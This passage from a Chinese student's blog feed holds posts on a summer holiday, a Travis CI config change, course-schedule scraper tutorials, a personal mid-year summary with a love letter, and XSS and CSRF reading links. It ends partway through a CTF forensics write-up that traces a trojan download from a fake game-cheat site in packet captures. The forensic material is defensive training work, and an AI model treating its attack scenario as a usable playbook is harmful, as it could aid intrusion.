class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>问题顺利解决。</p>]]></content>
      
      
        <tags>
            
            <tag> Tech </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>暑假结束 - 我爱的人和爱我的人</title>
      <link href="/2018/Summer-Holiday-End/"/>
      <url>/2018/Summer-Holiday-End/</url>
      <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=28445526&auto=1&height=66"></iframe><blockquote><p>I’ve been waiting for the time<br>Waiting for you to say you’re mine<br>Can’t hide these feelings inside<br>Let me hold you tonight<br>I really want you to know<br>All these feeling I have to show<br>How much I’ve been loving you<br>Tell me you’ll be mine<br>Gonna love you<br>Keep on loving you dear<br>I will love you<br>Till the end of time<br>I’ll be with you no matter what happens<br>I’ll be there by your side<br>I will hold you<br>Hold you here in my arms<br>I will promise I won’t let you go<br>Stay with me, make all our dreams come true<br>I will give you all I have<br>Cause you mean the whole world to me<br>I will love you with my heart<br>And we’ll never apart</p></blockquote><h1 id="假期的学习生活"><a href="#假期的学习生活" class="headerlink" title="假期的学习生活"></a>假期的学习生活</h1><p>沉迷高数和汇编，无法自拔。然而内容实在太多太杂，只能一点一点来。</p><p>成果： <a href="https://asm.kmahyyg.xyz" target="_blank" rel="noopener">汇编语言程序设计笔记</a>  <del> 高数 :( </del></p><p>新挖的坑：</p><ul><li>DONE | <a href="https://github.com/kmahyyg/fcitx-cloudpinyin-emoji" target="_blank" rel="noopener">fcitx4-cloudpinyin 的云输入提示优化</a></li><li>GIVE UP | <a href="https://github.com/kmahyyg/life-tg-bot" target="_blank" rel="noopener">给 Telegram Bot 加上菜鸟裹裹的快递接口</a></li><li>DONE | <a href="https://github.com/kmahyyg/kmahyyg.github.io" target="_blank" rel="noopener">博客实现 CI 全自动化部署并接入又拍云存储，主题升级到 1.5.6版本</a></li><li>DONE | <a href="https://github.com/kmahyyg/shu2ics" target="_blank" rel="noopener">给 Cindy 君写了一个抓课表的小程序 - 上海大学</a></li><li>DONE | <a href="https://github.com/kmahyyg/YNU2GCalendar" target="_blank" rel="noopener">修复已知的安全问题和 Bug</a></li><li>TODO | <a href="https://github.com/kmahyyg/coolq_bot_yyg" target="_blank" rel="noopener">将 Telegram Bot 功能接入 QQ 并进行自然语言分析</a></li></ul><p>发现的 BUG：</p><ul><li>Travis CI <code>sudo-required build</code> 日常宕机</li><li>Jetbrains IDEA 系列套件不支持 KWallet 致使密钥无法存储</li></ul><h1 id="假期的娱乐生活"><a href="#假期的娱乐生活" class="headerlink" title="假期的娱乐生活"></a>假期的娱乐生活</h1><p>也就是静静的找一家咖啡馆坐坐，写写作业，胡吃海喝 :(</p><p>打卡：</p><ul><li>高中兄弟重相聚</li><li>和 TaogeAwesome 去江湖一盏灯 <a href="https://www.bilibili.com/bangumi/play/ep231153" target="_blank" rel="noopener">B站链接</a></li><li>和 Cindy 君一起去猫咖撸猫（暴露铲屎官本性）</li></ul><p>预定： 下个假期一定去重庆看看白杨大哥</p><h1 id="假期的感情生活"><a href="#假期的感情生活" class="headerlink" title="假期的感情生活"></a>假期的感情生活</h1><blockquote><p>怎么说呢，有点难以开口。时间所剩不多，简单写写吧。</p></blockquote><p>心里的那个 ta 已经住下，已经认定，再也没有机会改变，再也放不下。很想也必须可以长久下去。也尽量在我力所能及的时候和 ta 聊聊天，陪伴 ta、包容 ta、和 ta 一起面对生活、一起成长，对 ta 的爱慕也与日俱增。</p><p>也只想淡淡定定地保护 ta 一生，也只有在 ta 面前，我可以放开一切，傻得像个孩子一样。</p><p>我们的很多经历是相似的，三观是在很大程度上一致的，剩下的东西，我觉得我已经把我的背面，完全给 ta 了。</p><p>You have my promise，我不会让一些悲剧，在我们这里重演，我们永远都是独立而又统一的整体。</p><p>可能，以前的我，还是太胆怯，还是太害怕，用一层一层的外壳伪装自己。ta 觉得不够了解我，这也完全是我在某种程度上自作自受的结果。</p><p>我很怕伤害到 ta，因为没有了 ta，我也就没有了这个世界，也再也没有人可以让我卸下伪装，说出心里的负担。</p><p>我愿意无论遇到什么困难，都以 我们这个整体 为重，珍惜、珍惜，保护 ta 直到我们一同逝去。</p><p>现在的我，已经没什么了，我只想和 ta 一起，dive into each other，keep in pair with our souls forever，turn whenever to forever.</p><p>我也不愿意再等待下去，这一次，我想改一改我不愿意强求任何东西的做法，我想霸道一点点，亲爱的小喵，给我一个机会，好吗？</p><h1 id="新学期，你好！"><a href="#新学期，你好！" class="headerlink" title="新学期，你好！"></a>新学期，你好！</h1><p>没事死忙，有事忙死！我爱开源！（更爱我家的那只喵）</p><p>Good Good Study, Day Day Up! XD</p><hr><p>By Patrick Y.</p><p>Aug 18,2018</p>]]></content>
      
      
        <tags>
            
            <tag> School </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>见鬼的 Travis CI</title>
      <link href="/2018/Sucked-Travis-CI/"/>
      <url>/2018/Sucked-Travis-CI/</url>
      <content type="html"><![CDATA[<h2 id="情况"><a href="#情况" class="headerlink" title="情况"></a>情况</h2><p>最近一个月内 Travis CI 出现了 5 次基础设施不可用的情况，参见 <a href="https://www.traviscistatus.com/history" target="_blank" rel="noopener">https://www.traviscistatus.com/history</a></p><p>所有 <code>sudo: required</code> Build 均会直接 Timeout 或者 Build 失败。</p><h2 id="努力"><a href="#努力" class="headerlink" title="努力"></a>努力</h2><p>与客服邮件沟通 3 次，无果。</p><h2 id="更改"><a href="#更改" class="headerlink" title="更改"></a>更改</h2><p>改动：</p><pre class="line-numbers language-git"><code class="language-git">From: kmahyyg &lt;16604643+kmahyyg@users.noreply.github.com>Date: Sat, 18 Aug 2018 07:32:49 +0800Subject: [PATCH] reroute ci build to container to avoid sucked travis ci<span class="token deleted">---</span> .travis.yml | 4 ++-- 1 file changed, 2 insertions(+), 2 deletions(-)diff --git a/.travis.yml b/.travis.ymlindex 6554487..925bfd9 100644<span class="token deleted">--- a/.travis.yml</span><span class="token inserted">+++ b/.travis.yml</span><span class="token coord">@@ -1,5 +1,5 @@</span><span class="token deleted">-dist: xenial</span><span class="token deleted">-sudo: required</span><span class="token inserted">+dist: trusty</span><span class="token inserted">+sudo: false</span> language: node_js node_js:<span class="token deleted">-- </span>2.18.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p>当尝试把 Build Reroute 到 Travis 的 Container-Based build infrastructure 之后，依然失败。同一个 Build, 人工重启后成功。问题仍然存在。</p><p>继续联系客服，等待回复，表达愤怒。</p>]]></content>
      
      
        <tags>
            
            <tag> Tech </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>爬取课表并转换为 ICS 文件</title>
      <link href="/2018/SHU2ICS-Tutorial/"/>
      <url>/2018/SHU2ICS-Tutorial/</url>
      <content type="html"><![CDATA[<h1 id="Windows-用户请直接看这里"><a href="#Windows-用户请直接看这里" class="headerlink" title="Windows 用户请直接看这里"></a>Windows 用户请直接看这里</h1><p>请您直接根据您所在的学校前往下列页面下载预编译好的 exe 文件，然后跳转到接下来的 <code>教程 Part 3</code> 部分，继续您的操作。</p><p> 云南大学：<a href="https://github.com/kmahyyg/YNU2GCalendar/releases" target="_blank" rel="noopener">https://github.com/kmahyyg/YNU2GCalendar/releases</a></p><p> 上海大学：<a href="https://github.com/kmahyyg/shu2ics/releases" target="_blank" rel="noopener">https://github.com/kmahyyg/shu2ics/releases</a></p><h1 id="其他用户建议编译安装"><a href="#其他用户建议编译安装" class="headerlink" title="其他用户建议编译安装"></a>其他用户建议编译安装</h1><hr><h2 id="以下为编译安装步骤。"><a href="#以下为编译安装步骤。" class="headerlink" title="以下为编译安装步骤。"></a>以下为编译安装步骤。</h2><h1 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h1><p>如果您发现运行过程中出现错误，请在对应项目页面重新下载代码并重新安装 <strong>项目依赖</strong> ，若仍然无法使用，请您提交 Issue, 我会检查并向您及时反馈。</p><h1 id="教程"><a href="#教程" class="headerlink" title="教程"></a>教程</h1><p>本文的主要目的是向使用以下项目的用户提供使用教程：</p><ul><li><p><a href="https://github.com/kmahyyg/ynu2gcalendar" target="_blank" rel="noopener">YNU2Gcalendar</a></p></li><li><p><a href="https://github.com/kmahyyg/shu2ics" target="_blank" rel="noopener">SHU2ICS</a></p></li></ul><p>请您根据您使用的项目点击目录侧对应的标题查看具体教程。</p><p>本次演示基于 Arch Linux, Mac OS应当可以正常使用。</p><p><del> 不保证 Windows 系统不会出现兼容性问题（咕咕咕），但是应该能正常运行。 </del></p><h2 id="系统环境依赖"><a href="#系统环境依赖" class="headerlink" title="系统环境依赖"></a>系统环境依赖</h2><p>Linux 用户请直接安装 <code>python3</code> 和 <code>python-pip</code> 包。</p><p>Windows 用户请安装 Python 并勾选 <code>Add to Path</code> 和 <code>Install PIP</code> 选项。</p><p>Mac OS 用户请直接使用此教程安装 <a href="https://pythonguidecn.readthedocs.io/zh/latest/starting/install3/osx.html" target="_blank" rel="noopener">https://pythonguidecn.readthedocs.io/zh/latest/starting/install3/osx.html</a> </p><p>下载 适用于 Windows 的 Python： <a href="https://www.python.org/downloads/release/python-370/" target="_blank" rel="noopener">https://www.python.org/downloads/release/python-370/</a></p><p>安装完成后，请您打开终端输入 <code>python3 --version &amp;&amp; pip3 --version</code> 查看是否正确安装完成。</p><p>正确回显：</p><p><img src="https://yygc.zzjnyyz.cn/asset_files/shu2ics_pyv.png" alt="pyversion"></p><h2 id="教程-Part-1：-下载代码并安装所需的项目依赖"><a href="#教程-Part-1：-下载代码并安装所需的项目依赖" class="headerlink" title="教程 Part 1： 下载代码并安装所需的项目依赖"></a>教程 Part 1： 下载代码并安装所需的项目依赖</h2><p>请您打开您的项目对应的网址：</p><p> 上海大学用户请点击 <a href="https://github.com/kmahyyg/shu2ics" target="_blank" rel="noopener">这里</a></p><p> 云南大学用户请点击 <a href="https://github.com/kmahyyg/ynu2gcalendar" target="_blank" rel="noopener">这里</a></p><p>点击页面的 “Clone or Download” 按钮，然后选择 “Download zip”</p><p><img src="https://yygc.zzjnyyz.cn/asset_files/2ics_dcode.png" alt="drepo"></p><p>将下载好的代码解压后，打开解压得到的文件夹，并在文件夹中打开终端，输入：</p><table><thead><tr><th style="text-align:center">平台</th><th style="text-align:center">代码</th></tr></thead><tbody><tr><td style="text-align:center">Windows</td><td style="text-align:center">python -m pip install -r requirements.txt</td></tr><tr><td style="text-align:center">Linux</td><td style="text-align:center">sudo pip3 install -r requirements.txt</td></tr><tr><td style="text-align:center">Mac OS</td><td style="text-align:center">sudo pip3 install -r requirements.txt</td></tr></tbody></table><p>安装依赖并耐心等待安装完成。</p><h2 id="教程-Part-2：-创建日历文件"><a href="#教程-Part-2：-创建日历文件" class="headerlink" title="教程 Part 2： 创建日历文件"></a>教程 Part 2： 创建日历文件</h2><p>如果出现任何报错，请您检查以上的环境安装是否正常完成。</p><h3 id="SHU2ICS"><a href="#SHU2ICS" class="headerlink" title="SHU2ICS"></a>SHU2ICS</h3><p>第一步：打开终端，执行 <code>python3 ./main.py</code></p><p>第二步：按照界面提示，根据格式输入一个学期开始的时间。接下来选择学期数，并输入您的教务系统帐号和密码。 <strong>输入密码时不会有任何回显，您无需担心，请直接往下输入，输入完成按下回车键即可！</strong></p><p><img src="https://yygc.zzjnyyz.cn/asset_files/shu2ics_op.png" alt="login"></p><p>第三步： 见到 <code>Validate Image</code> 开头的提示后，软件会自动弹出验证码，请您将验证码输入到对应位置。 <strong>验证码不区分大小写</strong></p><p><img src="https://yygc.zzjnyyz.cn/asset_files/shu2ics_capt1.png" alt="captcha notice"></p><p><img src="https://yygc.zzjnyyz.cn/asset_files/shu2ics_capt2.png" alt="captcha img"></p><p>第四步： 请您耐心等待，直到导出完成，这时候，在您的当前工作文件夹内会产生一个大小不为 0 的文件 <code>Course Schedule.ics</code> 文件。导出成功！</p><p><img src="https://yygc.zzjnyyz.cn/asset_files/shu2ics_suc.png" alt="ics file"></p><h3 id="YNU2Gcalendar"><a href="#YNU2Gcalendar" class="headerlink" title="YNU2Gcalendar"></a>YNU2Gcalendar</h3><p>第一步： 复制 <code>apikey.py.example</code> 并改名为 <code>apikey.py</code></p><p>第二步： 打开 <code>apikey.py</code> ，修改</p><table><thead><tr><th style="text-align:center">需要修改的地方</th><th style="text-align:center">在等号后面的<strong>引号内</strong>填入</th></tr></thead><tbody><tr><td style="text-align:center">ynu_ehall_name</td><td style="text-align:center">您的学号</td></tr><tr><td style="text-align:center">ynu_ehall_password</td><td style="text-align:center">您的教务系统密码</td></tr><tr><td style="text-align:center">mailacc</td><td style="text-align:center">MAILTO:您的邮箱</td></tr></tbody></table><p>并保存，关闭文本编辑器。</p><p><img src="https://yygc.zzjnyyz.cn/asset_files/ynu2ics_modify.png" alt="modify user login crediential"></p><p><strong>如果您的统一身份认证开启了两次确认验证或者单点登陆，本程序已经预置了处理代码，但不保证有效，请您暂时关闭。</strong></p><p><strong>如果您多次使用错误密码登陆触发了验证码，也请您根据界面提示输入验证码。 Linux 用户安装 Tesseract 库后可以选择使用自动识别验证码功能，其他系统用户无解，自动识别验证码功能的准确度大约在 85% 左右，如果自动识别不准确，还烦请您根据提示手动输入验证码。</strong></p><p>第三步：运行 <code>python3 ./client.py</code> 启动程序，按照提示接受免责声明并确认您已完成前面几步，接下来按任意键继续。程序模拟登陆完成后，请您输入当前学期共几周，一般为 18 ~ 20 周。只能输入整数！</p><p><img src="https://yygc.zzjnyyz.cn/asset_files/ynu2ics_op.png" alt="run photo"></p><p>第四步：运行完成，当前文件夹内会产生一个大小不为 0 的文件 <code>ynucal.ics</code>，导出成功！</p><p><img src="https://yygc.zzjnyyz.cn/asset_files/ynu2ics_suc1.png" alt="success"></p><p><img src="https://yygc.zzjnyyz.cn/asset_files/ynu2ics_suc2.png" alt="success2"></p><h2 id="教程-Part-3：-使用日历文件"><a href="#教程-Part-3：-使用日历文件" class="headerlink" title="教程 Part 3： 使用日历文件"></a>教程 Part 3： 使用日历文件</h2><p>您可以将导出的 ics 结尾的文件导出到几乎所有移动设备，并在移动设备打开，即可添加到您的手机系统自带日历！</p><p>上海大学用户默认课前 25 分钟提醒上课，云南大学用户默认课前 30 分钟提醒上课。</p><p>如果您使用 Mac，可以直接打开 ics 文件，您将会在您的日历应用中看到这个课表。</p><h2 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h2><ol><li><a href="https://github.com/JeromeTan1997" target="_blank" rel="noopener">JeromeTan1997</a></li><li>我的好基友 - Cindy  （滑稽</li></ol><h2 id="运行出现问题"><a href="#运行出现问题" class="headerlink" title="运行出现问题"></a>运行出现问题</h2><ol><li>请您检查上述步骤是否完整成功完成。</li><li>欢迎您在对应项目页面点击 Issue,创建一个新的 Issue 向我反馈。</li></ol><h2 id="开源协议"><a href="#开源协议" class="headerlink" title="开源协议"></a>开源协议</h2><p>我的所有代码均在 GNU Affero Public License V3.0 之下授权。</p>]]></content>
      
      
        <tags>
            
            <tag> School </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2018 年中 工作总结</title>
      <link href="/2018/2018-Mid-Work-Summary/"/>
      <url>/2018/2018-Mid-Work-Summary/</url>
      <content type="html"><![CDATA[<h1 id="2018-年中-工作总结"><a href="#2018-年中-工作总结" class="headerlink" title="2018 年中 工作总结"></a>2018 年中 工作总结</h1><blockquote><p>本文可能有些冗长，限于作者的表达能力有限，您可以随时关闭这篇文章。毕竟，这是给我自己看的个人总结。 （XD 辣鸡博客也没人看 2333</p><p>If you still want to go through this post, please be patient. There’s an idiom said “The most important thing is always in the end”.</p></blockquote><h2 id="校园生活-学习"><a href="#校园生活-学习" class="headerlink" title="校园生活 - 学习"></a>校园生活 - 学习</h2><h3 id="历史与现状"><a href="#历史与现状" class="headerlink" title="历史与现状"></a>历史与现状</h3><p>作为一个 “真·双一流”的大学生，当然要把学习放在最前面说。</p><p>度过了火红的 7 月，闲适的 8 月即将到来。经历了上个学期的打击之后，这个学期之中，我更加努力奋斗，减少了一些用于开源事业的时间，但仍然产出了一些实用的自用项目，例如：<a href="https://github.com/kmahyyg/YNU2GCalendar" target="_blank" rel="noopener">YNU2GCalendar</a>、<a href="https://github.com/kmahyyg/life-tg-bot" target="_blank" rel="noopener">Telegram Bot</a>、<a href="https://github.com/kmahyyg/ssrr_py_sub" target="_blank" rel="noopener">SSRR Linux Client With Subscription Support in Python</a> 。</p><p>在校内课程上，各课程均相对投入了更多的时间和精力进行学习。虽然我的高数还是再一次因为之前基础不牢和练习题目过少的原因挂掉了，但仍然感谢这一次任教这一课程的王超老师，感谢他对我学习的帮助，感谢他清晰、高效的讲解。我很后悔没有给上个学期的老师打0分。</p><p>我还要在这里感谢郁湧老师，前半段课程中因为口音问题实在没有听清讲授内容，课后也没有花更多的时间去弄明白那些相关的内容，在期中考短暂失利之后，老师与我们进行了进一步的沟通对话，将我从挂科的深渊挽救回来，这其中作为一个大学老师，他能在课后对我们做出这些帮助，个人深感三生有幸。</p><p>本学期各类课程均相对密集，还有第二课堂的压力，整体较为繁忙，不过仍相对圆满的完成了绝大多数课程，积累了不少相关知识和经验，特别感谢《计算机组成结构及原理》的王逍老师对课程相关或不相关内容的讨论和交流。</p><p>本学期期初主要的一个侧重点：第二课堂（共青团思政宣传教育课外课程），仍然用力不到位，导致目前仍然欠缺大约 20 积分的情况，下一学期由于课程更加繁忙，考虑寻找其他途径务必完成最终 60 积分的目标。</p><h3 id="未来的几个月"><a href="#未来的几个月" class="headerlink" title="未来的几个月"></a>未来的几个月</h3><p>总结过去，展望未来。由于寒暑假的时间对调，导致这个暑假异常的短，仅有不到一个月的时间，却也因为学校的管理问题，这个假期将会异常的繁忙。</p><p>对于即将到来的暑假，我对自己提出以下一点期望与三点要求：</p><ul><li>一点期望：1. 多与同学聚一聚、多与朋友聊一聊，广交益友，远离损友，远离酒肉朋友。</li><li>三点要求：<br>1.更加自律。充分运用 GTD 和 TODO LIST 工具，做好时间管理，规律作息，身体发展与智力发展并重。<br>2.完成对高等数学的进一步学习巩固。以《美国托马斯微积分教程》为基础，巩固加深对基础概念的理解并加以大量练习，开学的时候不留遗憾。<br>3.完成对《汇编语言程序设计》的自主学习。以《汇编语言 （第三版）》为蓝本，自主学习汇编语言，开学后旁听并完成相关实验，所有相关成果 <strong>必须</strong> 以 Gitbook 形式保存展示在 <a href="https://asm.kmahyyg.xyz" target="_blank" rel="noopener">个人站点</a>，在这里，也欢迎每一个看到这篇文章的人提交 PR 帮助改进。</li></ul><h2 id="校园生活-日常的那些琐碎"><a href="#校园生活-日常的那些琐碎" class="headerlink" title="校园生活 - 日常的那些琐碎"></a>校园生活 - 日常的那些琐碎</h2><p>就只说说宿舍吧。古语有云：“志不同道不合，不相与谋。” 宿舍的其他三个舍友热爱短视频与游戏，对我这样一个完全偏 Quiet 范的人来说，可以说完全不搭调。但请大家记住一点，<strong>保持对他人最基本的尊重</strong>。晚上熄灯以后，请不要外放音频或者大声吵闹，请尽可能的使用耳机。</p><p>宿舍的环境是大家共同生活、共同维护的，不要舍长不说话就不会动一动，公共区域暂且不提，请大家自觉维护好自己那一亩三分地的卫生。自觉定期轮流打扫卫生，是每一个宿舍成员最基本的责任。</p><h2 id="校园之外-自我提升的步伐"><a href="#校园之外-自我提升的步伐" class="headerlink" title="校园之外 - 自我提升的步伐"></a>校园之外 - 自我提升的步伐</h2><blockquote><p>画大饼时间到！</p></blockquote><p>To-do List:</p><ul><li>驾照学习</li><li>H5 + JS + CSS 前端开发学习</li><li>Java + Kotlin 移动开发学习</li><li>基于 Python 的与计算机底层交互的快速工具开发</li><li>英语学习 （例如： IELTS）</li></ul><p>本人在此承诺：所有本人在业余开发的程序，将尽可能维护到底，所有源代码均按照 GNU Affero Public License 3.0 开源。</p><h2 id="校内校外-那年那人那些事"><a href="#校内校外-那年那人那些事" class="headerlink" title="校内校外 - 那年那人那些事"></a>校内校外 - 那年那人那些事</h2><h3 id="2018-Wikipedia-Summer-Meetup-Kunming"><a href="#2018-Wikipedia-Summer-Meetup-Kunming" class="headerlink" title="2018 Wikipedia Summer Meetup @ Kunming"></a>2018 Wikipedia Summer Meetup @ Kunming</h3><p><img src="https://yygc.zzjnyyz.cn/asset_files/2018-wikipdaKM1.jpg" alt="WikiMeetup，图片打不开请使用科学上网软件"></p><p>参加了 <a href="https://zh.wikipedia.org/wiki/Wikipedia:%E8%81%9A%E4%BC%9A/%E4%B8%AD%E5%9B%BD%E5%A4%A7%E9%99%86%E7%A4%BE%E7%BE%A4%E8%81%9A%E4%BC%9A/2018%E6%98%86%E6%98%8E%E5%A4%8F%E8%81%9A" target="_blank" rel="noopener">2018 年 维基百科大陆维基人夏季聚会</a>，很开心在这次聚会上认识了各路豪杰，包括 Zhangmoon、Chen、河水、仪莎 和 Evelyn。他们很多都是（曾经或正在）旅居海外的华人，中文维基数十万用户，实际的参与编辑的月活跃用户其实不到五千。</p><p>维基百科作为一个中立、有一定专业性的人人参与的百科全书，是我们每个人查找资料的好工具。在这里，我鼓励每一个有条件的朋友积极查阅维基百科，获取更加权威的资料；如果你有一定的英文水平，也可以帮助翻译英文维基百科到中文维基百科；如果你在相关领域工作，你也可以帮助撰写完善相关条目。 Let’s make it great again!</p><h3 id="2018-Student-Open-Source-Conference-ChongQing"><a href="#2018-Student-Open-Source-Conference-ChongQing" class="headerlink" title="2018 Student Open-Source Conference @ ChongQing"></a>2018 Student Open-Source Conference @ ChongQing</h3><p><a href="https://openingsource.org/1859/zh-tw/" target="_blank" rel="noopener">2018 年中国大陆首届学生开源年会</a>，本来说要去，但由于课业原因没有前往，希望下一年能够赶上吧。能够与同一辈中的开源领袖进行沟通、交流也是让人开心的。希望每个人都能为开源社区建设贡献一份自己的力量。</p><h3 id="情感：那些心中青春的悸动"><a href="#情感：那些心中青春的悸动" class="headerlink" title="情感：那些心中青春的悸动"></a>情感：那些心中青春的悸动</h3><blockquote><p>前方高能，请非相关人士直接放弃阅读这一部分。<br>此部分将尽可能使用英文撰写。</p></blockquote><p>  My dearest Zoe,</p><p>  I hope this letter finds you well. I’m so sorry if I really did something hurt you so deeply. At the very first, I’m so glad and still hoping to be your best private treehole forever.</p><p>  Starting from the very beginning since September,2017 , We met each other. At that time, I’m bored to this life and society, being disappointed to each man around the society, cuz I believe that they all only know to chase the financial benefits.</p><p>  After some attempts to get in touch with you, I’ve already fallen in love with you silently, even myself didn’t notice it. I’ve hidden the inner man at the deepest place of my heart and kept showing poker faces for so many years due to a lot of unpleasant growth experience.</p><p>  Like something in the television series, right? I can’t believe that, but, It’s true, I met you here, in this beautiful scenery. That day, when you told me you’ve already found someone you preferred, my heart was hit heavily with something, and also found that you are really special in all the girls I met before. At that time, I didn’t think too much, and just give you my best wishes.</p><p>  When going back to school this year, I just met your a few times accidentally. I’m a truly warm-hearted man, I can’t stand someone I may consider so important seems so unhappy, I tried to comfort you. Of course, it takes some effects. And then, I just want to be your treehole. After a few times meeting, finally, I realized I have fallen in a trap so deeply, which called love.</p><p>  So I just tried to keep my heart in peace and stop that. I discovered that I have such a willing to protect you from being hurt. I can’t stop it myself from my inner space. And yesterday, a senior grade brother send a post in Qzone, said “The saddest one, of course is that you met someone special enough, but fully understand you will never get together with that man, Sooner or later, you’ll have to give it up”. As I final posted, “It is better to suffer short-term pain so that one will not have to suffer long-term pain”, I tried to cut off this impracticable daydream completely. ( My heart was completely broken, I can’t afford to lose you, I also never want to disrupt your life. I want to fully be yours, give everything I earned to you.)</p><p>  When I received your messages late this afternoon. I’m really astonished you used “so-called retribution”, that’s why I wrote this letter, that’s why I said I may crossed some borders that I shouldn’t.</p><p>  Apologize again for any inconvenience I brought to you.</p><p>  Best Wishes,<br>  Your possible forever private tree hole,<br>  Patrick</p><p>  July 17,2018</p><h2 id="版权信息"><a href="#版权信息" class="headerlink" title="版权信息"></a>版权信息</h2><p>Copyright Owned by Patrick Young<br>July 17, 2018<br>All Rights Reserved.<br>PLEASE DO NOT FORWARD TO ANY OTHER PLACE.</p>]]></content>
      
      
        <tags>
            
            <tag> School </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>InfoSec-XSS Attack</title>
      <link href="/2018/InfoSec-XSS/"/>
      <url>/2018/InfoSec-XSS/</url>
      <content type="html"><![CDATA[<p>期末考试复习，查了下XSS的相关资料，记录在此。</p><p><a href="https://www.ctolib.com/docs/sfile/xss-naxienian/index.html" target="_blank" rel="noopener">https://www.ctolib.com/docs/sfile/xss-naxienian/index.html</a></p><p><a href="https://www.knowsec.net/archives/78/" target="_blank" rel="noopener">https://www.knowsec.net/archives/78/</a></p><p><a href="https://www.zhihu.com/question/26628342" target="_blank" rel="noopener">https://www.zhihu.com/question/26628342</a></p>]]></content>
      
      
        <tags>
            
            <tag> Tech </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>InfoSec-CSRF and MISC</title>
      <link href="/2018/InfoSec_CSRF/"/>
      <url>/2018/InfoSec_CSRF/</url>
      <content type="html"><![CDATA[<p>今天上课的时候，老师提到了CSRF跨站脚本攻击，特查阅资料。<br>发现了一个有趣的博客，看起来作者在阿里工作。</p><h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p><a href="http://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html" target="_blank" rel="noopener">http://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html</a></p><p><a href="https://kennel209.gitbooks.io/owasp-testing-guide-v4/content/zh/web_application_security_testing/testing_for_cross_site_request_forgery_csrf_otg-sess-005.html" target="_blank" rel="noopener">https://kennel209.gitbooks.io/owasp-testing-guide-v4/content/zh/web_application_security_testing/testing_for_cross_site_request_forgery_csrf_otg-sess-005.html</a></p><h1 id="同一文件同样打包为ZIP，但MD5不同"><a href="#同一文件同样打包为ZIP，但MD5不同" class="headerlink" title="同一文件同样打包为ZIP，但MD5不同"></a>同一文件同样打包为ZIP，但MD5不同</h1><p><a href="http://adoyle.me/blog/why-zip-file-checksum-changed.html" target="_blank" rel="noopener">http://adoyle.me/blog/why-zip-file-checksum-changed.html</a></p>]]></content>
      
      
        <tags>
            
            <tag> Tech </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2018 Wikipedia Summer Meetup: Kunming</title>
      <link href="/2018/2018-Wikipedia-Summer-Meetup-Kunming/"/>
      <url>/2018/2018-Wikipedia-Summer-Meetup-Kunming/</url>
      <content type="html"><![CDATA[<p>详情戳这里：  <a href="https://zh.wikipedia.org/wiki/Wikipedia:%E8%81%9A%E4%BC%9A/2018%E6%98%86%E6%98%8E%E5%A4%8F%E8%81%9A" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/Wikipedia:%E8%81%9A%E4%BC%9A/2018%E6%98%86%E6%98%8E%E5%A4%8F%E8%81%9A</a></p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>2018 YNU CTF 信息安全铁人三项赛数据赛</title>
      <link href="/2018/2018-YNU-CTF-01/"/>
      <url>/2018/2018-YNU-CTF-01/</url>
      <content type="html"><![CDATA[<h1 id="Original-Source-（有改动）"><a href="#Original-Source-（有改动）" class="headerlink" title="Original Source （有改动）"></a>Original Source （有改动）</h1><blockquote><p>HTTPs://racinedee.github.io/2018/07/01/云南大学第一届信息安全铁人三项赛数据赛writeup/</p></blockquote><blockquote><p>第一届铁三校赛数据赛writeup。感觉比分区赛的题目要难，主要是题目中加了一个脑洞。  </p></blockquote><h1 id="O-O-O-O-O-O-O-O"><a href="#O-O-O-O-O-O-O-O" class="headerlink" title="-O-O-O-O-O-O-O-O-"></a>-O-O-O-O-O-O-O-O-</h1><p>###小利访问最频繁的网站是？（只填写一级域名） “小利访问最频繁的网站是？（只填写一级域名）”)小利访问最频繁的网站是？（只填写一级域名）</p><p>既然是访问最频繁的网站，所以直接筛选HTTP流量: Statistics - HTTP - Requests，按Percent降序排列，完成。</p><p><img src="https://yygc.zzjnyyz.cn/asset_files/2018-ynuctf1.png" alt=""></p><h3 id="小利的IP是多少？"><a href="#小利的IP是多少？" class="headerlink" title="小利的IP是多少？"></a>小利的IP是多少？</h3><p>从HTTP流量中可以发现发起请求最多的IP地址为192.168.12.126，从而可以判断小利的IP即为<code>192.168.12.126</code></p><h3 id="黑客的网站IP是什么？"><a href="#黑客的网站IP是什么？" class="headerlink" title="黑客的网站IP是什么？"></a>黑客的网站IP是什么？</h3><p>要找黑客网站IP，首先小利肯定对黑客网站进行了访问，所以对数据包进行筛选。这里当时比赛的时候是队友发现了这条异常流量，小利访问了一个域名为<a href="http://www.waigua.com的网站，下载了名为万能吃鸡助手的exe可执行文件。所以猜测黑客这就是黑客网站，而小利下载的文件就是木马文件(HTTP://www.waigua.com的网站，下载了名为万能吃鸡助手的exe可执行文件。所以猜测黑客这就是黑客网站，而小利下载的文件就是木马文件)" target="_blank" rel="noopener">www.waigua.com的网站，下载了名为万能吃鸡助手的exe可执行文件。所以猜测黑客这就是黑客网站，而小利下载的文件就是木马文件(HTTP://www.waigua.com的网站，下载了名为万能吃鸡助手的exe可执行文件。所以猜测黑客这就是黑客网站，而小利下载的文件就是木马文件)</a></p><p><img src="https://yygc.zzjnyyz.cn/asset_files/2018-ynuctf2.png" alt=""></p><p>所以黑客网站IP就是<code>192.168.12.148</code></p><h3 id="小利从黑客网站下载的文件名是什么？"><a href="#小利从黑客网站下载的文件名是什么？" class="headerlink" 